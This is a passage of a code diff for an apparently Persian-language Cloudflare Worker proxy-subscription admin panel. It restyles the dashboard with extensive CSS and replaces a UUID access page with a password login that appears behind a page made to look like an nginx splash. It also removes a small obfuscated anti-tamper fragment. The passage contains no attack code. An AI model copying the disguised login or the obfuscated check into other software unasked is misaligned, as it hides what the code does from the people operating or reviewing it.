-      ACCESS_MODE = mode === 'status' ? 'status' : 'admin';
-      var adminBtn = document.getElementById('modeAdmin');
-      var statusBtn = document.getElementById('modeStatus');
-      var label = document.getElementById('primaryBtnLabel');
-      var isAdmin = ACCESS_MODE === 'admin';
-      adminBtn.classList.toggle('active', isAdmin);
-      statusBtn.classList.toggle('active', !isAdmin);
-      adminBtn.setAttribute('aria-selected', isAdmin ? 'true' : 'false');
-      statusBtn.setAttribute('aria-selected', isAdmin ? 'false' : 'true');
-      label.textContent = isAdmin ? '⚡ ورود به پنل' : '👁 مشاهده وضعیت';
-      showMessage('', '');
-      var input = document.getElementById('uuidInput');
-      input.classList.remove('invalid');
-      if (!reduceMotionAllowed()) return;
-      var card = document.querySelector('.gateway-card');
-      card.style.animation = 'none';
-      void card.offsetWidth;
-      card.style.animation = 'fxFadeUp 0.5s cubic-bezier(0.22, 1, 0.36, 1) both';
-    }
-
-    function reduceMotionAllowed() {
-      try { return !(window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches); } catch (_e) { return true; }
-    }
-
-    function showMessage(text, type) {
-      var box = document.getElementById('msgBox');
-      if (!box) return;
-      box.className = 'msg-box' + (type ? ' msg-' + type : '');
-      box.textContent = text || '';
-      if (!text) box.style.display = 'none';
-    }
-
-    function cleanToken() {
-      return (document.getElementById('uuidInput').value || '').trim().replace(/^\\/+|\\/+$/g, '');
-    }
-
-    function getCleanToken() {
-      var val = cleanToken();
-      var input = document.getElementById('uuidInput');
-      if (!val) {
-        input.classList.add('invalid');
-        showMessage('لطفاً شناسه دسترسی یا UUID را وارد کنید.', 'error');
-        input.focus();
-        return '';
+    (function () {
+      var body = document.body;
+      var delay = ${Number.isFinite(delay) ? Math.max(0, delay) : 3000};
+      function reveal() {
+        body.classList.add('veiled');
+        var input = document.getElementById('adminPassword');
+        if (input) window.setTimeout(function () { try { input.focus({ preventScroll: true }); } catch (e) {} }, 260);
       }
-      input.classList.remove('invalid');
-      showMessage('', '');
-      return val;
-    }
+      window.setTimeout(reveal, delay);
+      // کلیک روی صفحه nginx (اختیاری) بلافاصله پنجره ورود را نشان می‌دهد
+      var splash = document.getElementById('nginxSplash');
+      if (splash) splash.addEventListener('click', reveal, { once: true });
 
-    function navigateTo(token) {
-      var primary = document.getElementById('primaryBtn');
-      primary.disabled = true;
-      showMessage(ACCESS_MODE === 'admin' ? 'در حال باز کردن پنل مدیریت…' : 'در حال باز کردن صفحه وضعیت…', 'info');
-      var target = ACCESS_MODE === 'admin'
-        ? '/' + encodeURIComponent(token)
-        : '/status/' + encodeURIComponent(token);
-      window.setTimeout(function () { window.location.href = target; }, 220);
-    }
-
-    function submitAccess() {
-      var token = getCleanToken();
-      if (!token) return;
-      navigateTo(token);
-    }
-
-    function enterAdmin() { setMode('admin'); submitAccess(); }
-    function enterStatus() { setMode('status'); submitAccess(); }
-
-    function pasteClipboard() {
-      if (!navigator.clipboard || !navigator.clipboard.readText) {
-        showMessage('مرورگر شما اجازه چسباندن خودکار نمی‌دهد؛ شناسه را دستی وارد کنید.', 'info');
-        document.getElementById('uuidInput').focus();
-        return;
+      var toggle = document.getElementById('pwToggle');
+      var input = document.getElementById('adminPassword');
+      if (toggle && input) {
+        toggle.addEventListener('click', function () {
+          input.type = input.type === 'password' ? 'text' : 'password';
+          input.focus({ preventScroll: true });
+        });
       }
-      navigator.clipboard.readText().then(function (text) {
-        var cleaned = String(text || '').trim();
-        if (!cleaned) {
-          showMessage('کلیپ‌بورد خالی است.', 'info');
-          return;
-        }
-        document.getElementById('uuidInput').value = cleaned;
-        document.getElementById('uuidInput').focus();
-        showMessage('شناسه از کلیپ‌بورد وارد شد.', 'info');
-      }).catch(function () {
-        showMessage('دسترسی به کلیپ‌بورد رد شد؛ شناسه را دستی وارد کنید.', 'info');
-      });
-    }
-
-    document.getElementById('uuidInput').addEventListener('keydown', function (e) {
-      if (e.key === 'Enter') {
-        if (e.shiftKey) { setMode('status'); }
-        else { setMode('admin'); }
-        submitAccess();
+      var errorBox = document.getElementById('lwError');
+      if (errorBox && errorBox.textContent.trim()) {
+        window.setTimeout(function () {
+          errorBox.style.display = 'block';
+          var win = document.querySelector('.login-window');
+          if (win) {
+            win.style.transition = 'transform .12s ease';
+            win.style.transform = 'translateX(6px)';
+            window.setTimeout(function () { win.style.transform = 'none'; }, 130);
+          }
+        }, 260);
       }
-    });
-    document.getElementById('uuidInput').addEventListener('input', function () {
-      this.classList.remove('invalid');
-      showMessage('', '');
-    });
-    document.addEventListener('keydown', function (e) {
-      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
-        e.preventDefault();
-        document.getElementById('uuidInput').value = '';
-        document.getElementById('uuidInput').focus();
-      }
-    });
+    })();
   </script>
 </body>
-</html>`;
+</html>`);
 }
 
 
@@ -9237,7 +9011,7 @@ function renderUserStatusPageHtml(user, nodes = [], originUrl = '') {
           ${client.note ? `<div class="client-note">${escapeHtml(client.note)}</div>` : ''}
         </div>`;
 
-  return `<!DOCTYPE html>
+  return deEmoji(`<!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
   <meta charset="UTF-8">
@@ -10120,7 +9894,7 @@ ${FX_RUNTIME_JS}
     });
   </script>
 </body>
-</html>`;
+</html>`);
 }
 
 
@@ -10131,7 +9905,7 @@ ${FX_RUNTIME_JS}
 // ============================================================================
 
 
-function renderAdminDashboardHtml(initialData = {}) {if(_0xMDC.tap(0x10)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+function renderAdminDashboardHtml(initialData = {}) {
   const safeInitialJson = safeJsonForScript({
     brand: BRAND_NAME,
     version: VERSION,
@@ -10144,7 +9918,7 @@ function renderAdminDashboardHtml(initialData = {}) {if(_0xMDC.tap(0x10)!==0x1){
     adminPath: initialData.adminPath || ''
   });
 
-  return `<!DOCTYPE html>
+  return deEmoji(`<!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
   <meta charset="UTF-8">
@@ -11180,6 +10954,327 @@ function renderAdminDashboardHtml(initialData = {}) {if(_0xMDC.tap(0x10)!==0x1){
     }
 ${FX_CSS}
 ${BASE_UI_CSS}
+    /* ================================================================
+       miliconfig OS shell v4 — لایه ظاهری «سیستم‌عامل»
+       پنجره شیشه‌ای، داک پایین، تایپوگرافی آرام و ترنزیشن‌های سبک
+       ================================================================ */
+    :root {
+      --os-bg: #05080a;
+      --os-panel: rgba(12, 18, 14, 0.72);
+      --os-panel-2: rgba(16, 24, 18, 0.86);
+      --os-line: rgba(181, 255, 77, 0.13);
+      --os-line-soft: rgba(255, 255, 255, 0.06);
+      --os-ink: #eaf3e4;
+      --os-ink-soft: #93a58e;
+      --os-accent: #b5ff4d;
+      --os-radius: 20px;
+      --os-ease: cubic-bezier(.22, .61, .36, 1);
+    }
+    html, body { height: 100%; }
+    body {
+      background:
+        radial-gradient(900px 520px at 78% -12%, rgba(163, 230, 53, 0.10), transparent 62%),
+        radial-gradient(700px 420px at 8% 108%, rgba(56, 189, 248, 0.05), transparent 60%),
+        var(--os-bg);
+      color: var(--os-ink);
+      font-family: "Vazirmatn", system-ui, -apple-system, "Segoe UI", Tahoma, sans-serif;
+      line-height: 1.6;
+      overflow: hidden;
+    }
+    body::before {
+      background-image:
+        linear-gradient(rgba(181, 255, 77, 0.018) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(181, 255, 77, 0.018) 1px, transparent 1px);
+      background-size: 56px 56px;
+      mask-image: radial-gradient(circle at 50% 0%, #000 0%, transparent 78%);
+      -webkit-mask-image: radial-gradient(circle at 50% 0%, #000 0%, transparent 78%);
+    }
+    .ic { width: 18px; height: 18px; flex: 0 0 auto; display: inline-block; vertical-align: -3px; }
+
+    /* ---------- چیدمان اصلی ---------- */
+    .app-shell {
+      display: block;
+      max-width: none;
+      margin: 0;
+      padding: 0;
+      min-height: 100dvh;
+      height: 100dvh;
+      gap: 0;
+    }
+    .main-area {
+      height: 100dvh;
+      overflow-y: auto;
+      overflow-x: hidden;
+      scroll-behavior: smooth;
+      padding: 14px clamp(12px, 3vw, 34px) 132px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      max-width: 1280px;
+      margin: 0 auto;
+    }
+
+    /* ---------- نوار بالا ---------- */
+    .topbar {
+      position: sticky;
+      top: 10px;
+      z-index: 30;
+      margin: 0 0 4px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      flex-wrap: wrap;
+      padding: 8px 12px;
+      border-radius: 16px;
+      border: 1px solid var(--os-line-soft);
+      background: rgba(9, 14, 11, 0.72);
+      backdrop-filter: blur(22px) saturate(140%);
+      -webkit-backdrop-filter: blur(22px) saturate(140%);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.32);
+    }
+    .topbar-right, .topbar-left { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .tb-brand { display: flex; align-items: center; gap: 9px; }
+    .tb-logo { width: 30px; height: 30px; display: grid; place-items: center; }
+    .tb-logo svg { width: 30px; height: 30px; }
+    .tb-name { display: flex; flex-direction: column; line-height: 1.05; }
+    .tb-name b { font-size: 0.92rem; letter-spacing: 0.06em; }
+    .tb-name small { font-size: 0.56rem; letter-spacing: 0.2em; color: var(--os-accent); opacity: 0.85; direction: ltr; }
+    .page-title { font-size: 0.95rem; font-weight: 700; color: var(--os-ink); margin-inline-start: 2px; }
+    .topbar-brand { display: none; }
+    .top-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 7px 11px;
+      border-radius: 11px;
+      border: 1px solid var(--os-line-soft);
+      background: rgba(255, 255, 255, 0.03);
+      color: var(--os-ink-soft);
+      font: inherit;
+      font-size: 0.78rem;
+      cursor: pointer;
+      text-decoration: none;
+      transition: color .18s var(--os-ease), border-color .18s var(--os-ease), background .18s var(--os-ease), transform .18s var(--os-ease);
+    }
+    .top-pill:hover { color: var(--os-ink); border-color: rgba(181, 255, 77, 0.34); background: rgba(181, 255, 77, 0.07); transform: translateY(-1px); }
+    .top-pill.accent { background: linear-gradient(180deg, #c8ff6b, #a3e635); color: #10160b; border-color: transparent; font-weight: 700; }
+    .top-pill.accent:hover { color: #10160b; background: linear-gradient(180deg, #d6ff8c, #b5ff4d); }
+    .menu-toggle { display: none; }
+    .clock-card { display: flex; flex-direction: row; align-items: baseline; gap: 7px; padding: 0 4px; }
+    .clock-time { font-size: 0.85rem; font-weight: 700; color: var(--os-ink); font-variant-numeric: tabular-nums; direction: ltr; }
+    .clock-date { font-size: 0.68rem; color: var(--os-ink-soft); }
+    .dot-online { width: 7px; height: 7px; border-radius: 50%; background: var(--os-accent); box-shadow: 0 0 0 3px rgba(181, 255, 77, 0.16); flex: 0 0 auto; }
+
+    /* ---------- داک پایین (ناوبری) ---------- */
+    .sidebar {
+      position: fixed;
+      z-index: 40;
+      inset-inline: 0;
+      bottom: 18px;
+      margin: 0 auto;
+      width: max-content;
+      max-width: calc(100vw - 20px);
+      height: auto;
+      top: auto;
+      padding: 7px;
+      border-radius: 20px;
+      border: 1px solid var(--os-line-soft);
+      background: rgba(10, 15, 12, 0.78);
+      backdrop-filter: blur(24px) saturate(150%);
+      -webkit-backdrop-filter: blur(24px) saturate(150%);
+      box-shadow: 0 18px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      display: flex;
+      align-items: center;
+      gap: 2px;
+      overflow-x: auto;
+      scrollbar-width: none;
+    }
+    .sidebar::-webkit-scrollbar { display: none; }
+    .sidebar > div:first-child { display: flex; align-items: center; gap: 2px; }
+    .sb-brand, .sb-group-title, .sb-close, .sb-footer, .sb-status-pill { display: none; }
+    .sb-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+      min-width: 68px;
+      padding: 8px 10px 7px;
+      border: 0;
+      border-radius: 14px;
+      background: transparent;
+      color: var(--os-ink-soft);
+      font: inherit;
+      font-size: 0.66rem;
+      cursor: pointer;
+      transition: color .18s var(--os-ease), background .18s var(--os-ease), transform .18s var(--os-ease);
+      position: relative;
+    }
+    .sb-item span { display: inline-flex; align-items: center; gap: 4px; }
+    .sb-item .ic { width: 21px; height: 21px; margin-bottom: 1px; }
+    .sb-item:hover { color: var(--os-ink); background: rgba(255, 255, 255, 0.05); }
+    .sb-item.active { color: #0f150a; background: linear-gradient(180deg, #c9ff74, #a8ea3f); box-shadow: 0 6px 18px rgba(163, 230, 53, 0.25); }
+    .sb-badge { position: absolute; top: 4px; inset-inline-end: 6px; font-size: 0.55rem; padding: 0 5px; border-radius: 999px; background: rgba(0, 0, 0, 0.28); color: inherit; }
+    .sb-item.active .sb-badge { background: rgba(0, 0, 0, 0.18); }
+
+    /* ---------- پنجره‌ها و کارت‌ها ---------- */
+    .view-section { display: none; flex-direction: column; gap: 12px; animation: osFade .26s var(--os-ease); }
+    .view-section.active { display: flex; }
+    @keyframes osFade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+    .panel-card, .fx-card, .hero-card, .preset-card, .pool-picker, .check-grid {
+      background: var(--os-panel);
+      border: 1px solid var(--os-line-soft);
+      border-radius: var(--os-radius);
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.22);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+    }
+    .panel-card { padding: 16px; }
+    .panel-head { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 0 0 12px; border-bottom: 1px solid var(--os-line-soft); margin-bottom: 14px; }
+    .panel-title { font-size: 0.94rem; font-weight: 700; display: flex; align-items: center; gap: 7px; }
+    .panel-title .ic { width: 17px; height: 17px; color: var(--os-accent); }
+    .panel-sub { font-size: 0.72rem; color: var(--os-ink-soft); }
+
+    .hero-card { display: flex; align-items: center; justify-content: space-between; gap: 16px; padding: 20px 22px; overflow: hidden; position: relative; }
+    .hero-card::after { content: ""; position: absolute; inset: auto -8% -60% 34%; height: 220px; background: radial-gradient(circle, rgba(181, 255, 77, 0.14), transparent 62%); pointer-events: none; }
+    .hero-eyebrow { font-size: 0.62rem; letter-spacing: 0.22em; color: var(--os-accent); direction: ltr; opacity: 0.8; }
+    .hero-heading { font-size: 1.18rem; font-weight: 800; margin: 6px 0 6px; line-height: 1.5; }
+    .hero-sub { font-size: 0.8rem; color: var(--os-ink-soft); max-width: 62ch; }
+    .hero-badges { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 12px; }
+    .hero-badge { display: inline-flex; align-items: center; gap: 5px; font-size: 0.7rem; padding: 5px 9px; border-radius: 9px; background: rgba(255, 255, 255, 0.04); border: 1px solid var(--os-line-soft); color: var(--os-ink-soft); }
+    .hero-badge .ic { width: 14px; height: 14px; }
+    .hero-emblem {
+      width: 84px; height: 84px; border-radius: 26px; flex: 0 0 auto;
+      display: grid; place-items: center; font-weight: 900; font-size: 1.6rem; color: #0d130a;
+      background: linear-gradient(155deg, #d8ff90, #86d21c 72%);
+      box-shadow: 0 14px 40px rgba(163, 230, 53, 0.28), inset 0 1px 0 rgba(255, 255, 255, 0.5);
+    }
+
+    .metrics-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(178px, 1fr)); gap: 10px; }
+    .metric-card { position: relative; padding: 13px 14px; border-radius: 16px; background: var(--os-panel); border: 1px solid var(--os-line-soft); transition: transform .2s var(--os-ease), border-color .2s var(--os-ease); }
+    .metric-card:hover { transform: translateY(-2px); border-color: rgba(181, 255, 77, 0.28); }
+    .metric-top { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
+    .metric-label { font-size: 0.7rem; color: var(--os-ink-soft); }
+    .metric-icon { color: var(--os-accent); display: inline-flex; }
+    .metric-value { font-size: 1.24rem; font-weight: 800; margin-top: 5px; font-variant-numeric: tabular-nums; letter-spacing: -0.01em; }
+    .metric-foot { font-size: 0.66rem; color: var(--os-ink-soft); margin-top: 2px; }
+    .dash-row-2, .dash-row-3, .dash-row-bottom { display: grid; gap: 10px; }
+    .dash-row-2 { grid-template-columns: 1.25fr 1fr; }
+    .dash-row-3 { grid-template-columns: repeat(3, 1fr); }
+    .dash-row-bottom { grid-template-columns: 1fr 1fr; }
+
+    /* ---------- کنترل‌ها ---------- */
+    .btn-neon, .btn-ghost, .btn-danger, .sb-btn, .copy-btn, .dl-btn {
+      display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+      font: inherit; font-size: 0.8rem; font-weight: 600; cursor: pointer;
+      padding: 9px 13px; border-radius: 11px; border: 1px solid transparent;
+      transition: transform .16s var(--os-ease), background .16s var(--os-ease), border-color .16s var(--os-ease), color .16s var(--os-ease);
+      text-decoration: none;
+    }
+    .btn-neon { background: linear-gradient(180deg, #c9ff74, #a3e635); color: #10160b; box-shadow: 0 8px 20px rgba(163, 230, 53, 0.2); }
+    .btn-neon:hover { transform: translateY(-1px); }
+    .btn-ghost { background: rgba(255, 255, 255, 0.04); border-color: var(--os-line-soft); color: var(--os-ink); }
+    .btn-ghost:hover { background: rgba(255, 255, 255, 0.07); border-color: rgba(181, 255, 77, 0.3); }
+    .btn-danger { background: rgba(248, 113, 113, 0.12); border-color: rgba(248, 113, 113, 0.3); color: #fca5a5; }
+    .btn-danger:hover { background: rgba(248, 113, 113, 0.2); }
+    .copy-btn, .dl-btn { padding: 6px 9px; font-size: 0.7rem; background: rgba(255, 255, 255, 0.04); border-color: var(--os-line-soft); color: var(--os-ink-soft); }
+    .copy-btn:hover, .dl-btn:hover { color: var(--os-ink); border-color: rgba(181, 255, 77, 0.3); }
+
+    .mili-input, .mili-select, .mili-textarea, input[type="text"], input[type="number"], input[type="search"], input[type="password"], select, textarea {
+      width: 100%; font: inherit; font-size: 0.82rem; color: var(--os-ink);
+      padding: 9px 11px; border-radius: 11px;
+      background: rgba(6, 10, 8, 0.86); border: 1px solid var(--os-line-soft);
+      transition: border-color .16s var(--os-ease), box-shadow .16s var(--os-ease);
+    }
+    .mili-input:focus, .mili-select:focus, .mili-textarea:focus, input:focus, select:focus, textarea:focus {
+      outline: none; border-color: rgba(181, 255, 77, 0.55); box-shadow: 0 0 0 3px rgba(181, 255, 77, 0.12);
+    }
+    .mili-select { appearance: none; background-image: linear-gradient(45deg, transparent 50%, var(--os-ink-soft) 50%), linear-gradient(135deg, var(--os-ink-soft) 50%, transparent 50%); background-position: calc(0% + 13px) 52%, calc(0% + 18px) 52%; background-size: 5px 5px, 5px 5px; background-repeat: no-repeat; padding-inline-start: 28px; }
+    .field-box { display: flex; flex-direction: column; gap: 5px; min-width: 0; }
+    .field-label { font-size: 0.72rem; color: var(--os-ink-soft); display: flex; align-items: center; gap: 5px; }
+    .field-hint { font-size: 0.64rem; color: rgba(147, 165, 142, 0.72); }
+    .form-grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .form-grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+    .check-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr)); gap: 8px; padding: 10px; }
+    .check-label { display: flex; align-items: center; gap: 8px; padding: 8px 10px; border-radius: 11px; background: rgba(255, 255, 255, 0.03); font-size: 0.78rem; cursor: pointer; transition: background .16s var(--os-ease); }
+    .check-label:hover { background: rgba(181, 255, 77, 0.08); }
+    .check-label input[type="checkbox"] { appearance: none; width: 38px; height: 21px; border-radius: 999px; background: rgba(255, 255, 255, 0.1); border: 1px solid var(--os-line-soft); position: relative; cursor: pointer; transition: background .18s var(--os-ease); }
+    .check-label input[type="checkbox"]::after { content: ""; position: absolute; top: 2px; inset-inline-start: 2px; width: 15px; height: 15px; border-radius: 50%; background: #cbd5c4; transition: transform .18s var(--os-ease), background .18s var(--os-ease); }
+    .check-label input[type="checkbox"]:checked { background: rgba(181, 255, 77, 0.3); }
+    .check-label input[type="checkbox"]:checked::after { transform: translateX(-16px); background: var(--os-accent); }
+
+    /* ---------- کاربران ---------- */
+    .users-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 10px; }
+    .user-card { padding: 14px; border-radius: 16px; background: var(--os-panel); border: 1px solid var(--os-line-soft); transition: transform .2s var(--os-ease), border-color .2s var(--os-ease); }
+    .user-card:hover { transform: translateY(-2px); border-color: rgba(181, 255, 77, 0.26); }
+    .uc-top { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
+    .uc-name { font-size: 0.9rem; font-weight: 700; }
+    .uc-avatar { width: 34px; height: 34px; border-radius: 11px; display: grid; place-items: center; background: rgba(181, 255, 77, 0.12); color: var(--os-accent); font-weight: 800; }
+    .uc-uuid { font-size: 0.62rem; color: var(--os-ink-soft); direction: ltr; text-align: left; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
+    .uc-id-box { display: flex; align-items: center; gap: 6px; margin: 8px 0; padding: 6px 8px; border-radius: 9px; background: rgba(0, 0, 0, 0.28); border: 1px solid var(--os-line-soft); }
+    .uc-stats { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin: 8px 0; }
+    .uc-stat-line { display: flex; justify-content: space-between; gap: 6px; font-size: 0.7rem; color: var(--os-ink-soft); }
+    .uc-stats b, .uc-stat-line b { color: var(--os-ink); font-weight: 700; }
+    .uc-actions { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 10px; }
+    .uc-gauge { height: 5px; border-radius: 999px; background: rgba(255, 255, 255, 0.08); overflow: hidden; }
+    .uc-gauge span, .uc-gauge > div { display: block; height: 100%; background: linear-gradient(90deg, #86d21c, #d8ff90); }
+    .bad, .ok, .live, .wait, .ping-badge { display: inline-flex; align-items: center; gap: 4px; font-size: 0.66rem; padding: 3px 8px; border-radius: 999px; border: 1px solid transparent; }
+    .ok, .live { background: rgba(181, 255, 77, 0.12); color: #cdf98a; border-color: rgba(181, 255, 77, 0.24); }
+    .bad { background: rgba(248, 113, 113, 0.12); color: #fca5a5; border-color: rgba(248, 113, 113, 0.26); }
+    .wait { background: rgba(251, 191, 36, 0.12); color: #fcd34d; border-color: rgba(251, 191, 36, 0.24); }
+    .preset-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); gap: 9px; }
+    .preset-card { padding: 12px; cursor: pointer; border-radius: 14px; transition: border-color .18s var(--os-ease), transform .18s var(--os-ease); }
+    .preset-card:hover { border-color: rgba(181, 255, 77, 0.3); transform: translateY(-1px); }
+    .preset-card.active, .preset-card.sel { border-color: rgba(181, 255, 77, 0.6); background: rgba(181, 255, 77, 0.07); }
+    .preset-title { font-size: 0.8rem; font-weight: 700; }
+    .preset-sub { font-size: 0.68rem; color: var(--os-ink-soft); margin-top: 3px; }
+    .preset-tags { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 8px; }
+    .preset-tag { font-size: 0.62rem; padding: 2px 7px; border-radius: 999px; background: rgba(255, 255, 255, 0.05); color: var(--os-ink-soft); }
+    .kv-list { display: flex; flex-direction: column; gap: 2px; }
+    .kv-row { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 7px 2px; border-bottom: 1px dashed rgba(255, 255, 255, 0.06); font-size: 0.76rem; }
+    .kv-row:last-child { border-bottom: 0; }
+    .kv-key { color: var(--os-ink-soft); }
+    .kv-val { font-weight: 600; text-align: left; }
+    .empty-state { padding: 26px 14px; text-align: center; color: var(--os-ink-soft); font-size: 0.8rem; }
+    .quick-bar { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
+    .pool-row { display: flex; align-items: center; justify-content: space-between; gap: 8px; padding: 8px 10px; border-radius: 11px; background: rgba(255, 255, 255, 0.03); margin-bottom: 5px; font-size: 0.75rem; }
+    .pool-row-actions { display: flex; gap: 5px; }
+    .pool-picker { padding: 14px; }
+    .pool-picker-head { display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: wrap; }
+    .pool-picker-meta { font-size: 0.7rem; color: var(--os-ink-soft); }
+
+    /* ---------- مودال ---------- */
+    .modal-backdrop { position: fixed; inset: 0; z-index: 90; display: none; align-items: center; justify-content: center; padding: 16px; background: rgba(3, 6, 4, 0.72); backdrop-filter: blur(10px); }
+    .modal-backdrop.open { display: flex; }
+    .modal-box { width: min(760px, 100%); max-height: 88dvh; overflow-y: auto; padding: 18px; border-radius: 22px; background: var(--os-panel-2); border: 1px solid var(--os-line); box-shadow: 0 30px 80px rgba(0, 0, 0, 0.55); animation: osPop .22s var(--os-ease); }
+    @keyframes osPop { from { opacity: 0; transform: scale(.97) translateY(8px); } to { opacity: 1; transform: none; } }
+    .modal-sec-title { font-size: 0.78rem; font-weight: 700; color: var(--os-accent); margin: 14px 0 8px; display: flex; align-items: center; gap: 6px; }
+    .modal-actions { display: flex; justify-content: flex-end; gap: 8px; margin-top: 16px; }
+
+    /* ---------- واکنش‌گرا ---------- */
+    @media (max-width: 980px) {
+      .dash-row-2, .dash-row-3, .dash-row-bottom { grid-template-columns: 1fr; }
+      .hero-emblem { display: none; }
+      .form-grid-2, .form-grid-3 { grid-template-columns: 1fr; }
+      .topbar { top: 6px; }
+      .clock-date { display: none; }
+    }
+    @media (max-width: 720px) {
+      .main-area { padding: 10px 12px 118px; }
+      .topbar { padding: 8px; }
+      .page-title { font-size: 0.86rem; }
+      .tb-name small { display: none; }
+      .menu-toggle { display: inline-flex; }
+      .sidebar { bottom: 10px; width: calc(100vw - 16px); padding: 6px; justify-content: flex-start; }
+      .sb-item { min-width: 60px; flex: 1 0 auto; font-size: 0.6rem; padding: 7px 6px; }
+      .sb-item .ic { width: 19px; height: 19px; }
+      .metrics-grid { grid-template-columns: 1fr 1fr; }
+      .uc-stats { grid-template-columns: 1fr; }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      .view-section, .modal-box { animation: none; }
+    }
   </style>
 </head>
 <body>
@@ -11189,59 +11284,28 @@ ${BASE_UI_CSS}
     <!-- سایدبار سمت راست دسکتاپ -->
     <!-- پرده محو پشت منوی کشویی راست (فقط موبایل) -->
     <div class="sb-scrim" id="sbScrim" onclick="toggleSidebarDrawer(false)"></div>
-    <aside class="sidebar">
+    <aside class="sidebar" aria-label="ناوبری اصلی سیستم">
       <div>
-        <div class="sb-brand">
-          <div class="sb-brand-text">
-            <div class="sb-brand-title">${BRAND_UPPER}</div>
-            <div class="sb-brand-sub">CLOUDFLARE D1 CONTROL</div>
-          </div>
-          <div class="sb-logo">${SHIELD_LOGO_SVG}</div>
-          <button type="button" class="sb-close" onclick="closeSidebarDrawer()" aria-label="بستن منو">✕</button>
-        </div>
-
-        <div class="sb-group-title"><span>نمای کلی</span><span>۱</span></div>
         <button type="button" class="sb-item active" data-view="dashboard" onclick="switchView('dashboard')">
-          <span>⊞ داشبورد</span>
+          ${ICON('dashboard')}<span>داشبورد</span>
         </button>
-
-        <div class="sb-group-title"><span>کاربران و نودها</span><span>۲</span></div>
         <button type="button" class="sb-item" data-view="users" onclick="switchView('users')">
-          <span>👥 کاربران</span>
+          ${ICON('users')}<span>کاربران</span>
           <span class="sb-badge" id="sbUserCount">0</span>
         </button>
         <button type="button" class="sb-item" data-view="nodes" onclick="switchView('nodes')">
-          <span>⚡ نودها و تست تاخیر</span>
+          ${ICON('nodes')}<span>نودها</span>
           <span class="sb-badge" id="sbNodeCount">0</span>
         </button>
-
-        <div class="sb-group-title"><span>شبکه و لبه</span><span>۱</span></div>
         <button type="button" class="sb-item" data-view="network" onclick="switchView('network')">
-          <span>☁️ پروتکل‌ها و مسیریابی</span>
+          ${ICON('network')}<span>شبکه</span>
         </button>
-
-        <div class="sb-group-title"><span>پنل و ظاهر</span><span>۱</span></div>
         <button type="button" class="sb-item" data-view="panel" onclick="switchView('panel')">
-          <span>✎ مسیر و تبدیل اشتراک</span>
+          ${ICON('sliders')}<span>اشتراک</span>
         </button>
-
-        <div class="sb-group-title"><span>سیستم</span><span>۱</span></div>
         <button type="button" class="sb-item" data-view="system" onclick="switchView('system')">
-          <span>⚙️ تنظیمات و دیتابیس D1</span>
+          ${ICON('system')}<span>سیستم</span>
         </button>
-      </div>
-
-      <div class="sb-footer">
-        <div class="clock-card">
-          <div class="clock-time" id="liveClock">00:00:00</div>
-          <div class="clock-date" id="liveDate">در حال بارگذاری...</div>
-        </div>
-        <div class="sb-status-pill">
-          <span class="dot-online"></span>
-          <span id="sbD1StatusText">سیستم آنلاین است</span>
-        </div>
-        <a class="sb-btn" href="${SUPPORT_CHANNEL_URL}" target="_blank" rel="noopener noreferrer">🔗 ${SUPPORT_CHANNEL_LABEL}</a>
-        <button type="button" class="sb-btn sb-btn-logout" onclick="window.location.href='/'">خروج از حساب</button>
       </div>
     </aside>
 
@@ -11250,15 +11314,24 @@ ${BASE_UI_CSS}
       <!-- نوار بالا -->
       <header class="topbar">
         <div class="topbar-right">
-          <button type="button" class="top-pill menu-toggle" onclick="toggleSidebarDrawer()" aria-expanded="false" aria-label="باز و بسته کردن منو">☰ منو</button>
+          <button type="button" class="top-pill menu-toggle" onclick="toggleSidebarDrawer()" aria-expanded="false" aria-label="منو">${ICON('menu')}</button>
+          <div class="tb-brand">
+            <span class="tb-logo">${SHIELD_LOGO_SVG}</span>
+            <span class="tb-name"><b>${BRAND_UPPER}</b><small>CONTROL CENTER</small></span>
+          </div>
           <h1 class="page-title" id="topPageTitle">داشبورد</h1>
         </div>
         <div class="topbar-left">
-          <span class="topbar-brand">${BRAND_UPPER} CONTROL CENTER</span>
-          <span class="top-pill live"><span class="dot-online"></span> زنده</span>
-          <button type="button" class="top-pill" onclick="switchView('users'); openUserModal(null);">+ کاربر جدید</button>
-          <button type="button" class="top-pill" onclick="initD1Database()">🛡️ بررسی D1</button>
